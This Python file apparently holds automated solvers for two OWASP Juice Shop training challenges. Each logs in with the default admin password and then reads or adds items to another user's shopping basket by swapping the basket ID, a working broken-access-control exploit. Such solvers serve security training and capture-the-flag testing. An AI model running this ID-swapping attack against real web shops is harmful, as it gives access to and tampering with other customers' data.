from core.base_solver import BaseSolver
from loguru import logger

class ViewBasketSolver(BaseSolver):
    @property
    def challenge_key(self) -> str:
        return "basketAccessChallenge"

    def solve(self) -> bool:
        # Access another user's basket
        login_res = self.client.post("/rest/user/login", json={"email": "admin@juice-sh.op", "password": "admin123"})
        data = login_res.json().get("authentication", {})
        token = data.get("token")
        my_bid = data.get("bid")
        headers = {"Authorization": f"Bearer {token}"}
        
        target_bid = 2 if my_bid != 2 else 1
        res = self.client.get(f"/rest/basket/{target_bid}", headers=headers)
        return res.status_code == 200

class ManipulateBasketSolver(BaseSolver):
    @property
    def challenge_key(self) -> str:
        return "basketManipulateChallenge"

    def solve(self) -> bool:
        # Put item into another user's basket
        login_res = self.client.post("/rest/user/login", json={"email": "admin@juice-sh.op", "password": "admin123"})
        data = login_res.json().get("authentication", {})
        token = data.get("token")
        my_bid = data.get("bid")
        headers = {"Authorization": f"Bearer {token}"}
        
        target_bid = 2 if my_bid != 2 else 1
        payload = {
            "ProductId": 1,
            "BasketId": str(target_bid),
            "quantity": 1
        }
        res = self.client.post("/api/BasketItems", json=payload, headers=headers)
        return res.status_code == 201



